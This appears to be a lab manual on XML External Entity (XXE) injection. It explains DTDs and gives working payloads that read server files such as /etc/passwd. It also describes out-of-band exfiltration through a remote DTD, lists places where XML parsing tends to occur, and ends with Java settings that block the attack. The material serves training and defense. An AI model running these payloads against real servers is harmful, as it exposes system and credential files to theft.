# 🧠 Lab Manual: XXE External Entity Injection

### 0. Preface
XML appears to be just a data format, but its specification hides a powerful and dangerous feature — **External Entities**. Attackers can use it to make XML parsers read files on the server, initiate network requests, or even cause denial of service.

*   **XXE (XML External Entity)**: Exploiting XML parser's handling of external entity declarations to perform unintended operations on the server.
*   **Core Concept**: XML isn't just data — it can "command" parsers to fetch external resources.

This chapter's goal: **Learn to identify XML parsing points and exploit external entities to read sensitive server files.**

---

### 1. XML & DTD Basics

**XML Document Structure**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!-- DTD declarations go here -->
]>
<root>
  <element>content</element>
</root>
```

**Entity Declaration**:
```xml
<!DOCTYPE root [
  <!ENTITY name "Hello World">
]>
<root>&name;</root>
<!-- After parsing: <root>Hello World</root> -->
```

**External Entity** — the core of XXE:
```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
<!-- Parser reads /etc/passwd content and inserts it -->
```

---

### 2. Basic XXE — File Read

**Attack Scenario**: Any endpoint that accepts and parses XML input.

**Payload Template**:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///path/to/secret">
]>
<data>
  <field>&xxe;</field>
</data>
```

**Prerequisites**:
- Server parses XML input
- Parser hasn't disabled external entities
- Parsed results are reflected in response

---

### 3. Blind XXE — OOB Exfiltration

**Problem**: What if the server parses XML but doesn't reflect content?

**Solution**: Use Parameter Entities to exfiltrate data via HTTP requests.

**Parameter Entity Syntax**:
```xml
<!ENTITY % name "value">
%name;   <!-- Referenced within DTD -->
```

**OOB Exfiltration Flow**:
1. Parser reads target file into `%file`
2. Loads remote DTD
3. DTD constructs new entity, embedding `%file` content into a URL
4. Parser accesses that URL → data is exfiltrated

---

### 4. Content-Type Switch Attack

**Discovery approach**: Some APIs appear to only accept JSON, but the backend framework also supports XML.

**Identification Method**:
```
1. Normal request: Content-Type: application/json
2. Try changing to: Content-Type: application/xml
3. Rewrite JSON body as XML with XXE payload
```

---

### 5. Identifying XXE Attack Surface

**Where might XML parsing exist?**
- File uploads (SVG, DOCX, XLSX are all XML)
- SOAP endpoints
- RSS/Atom feeds
- Configuration import features
- API endpoints (may have hidden XML support)
- SAML authentication

---

### 6. Defense Measures

**Disable External Entities** (Java example):
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

---

**[Ready? Go explore the "hidden features" of XML parsers]**
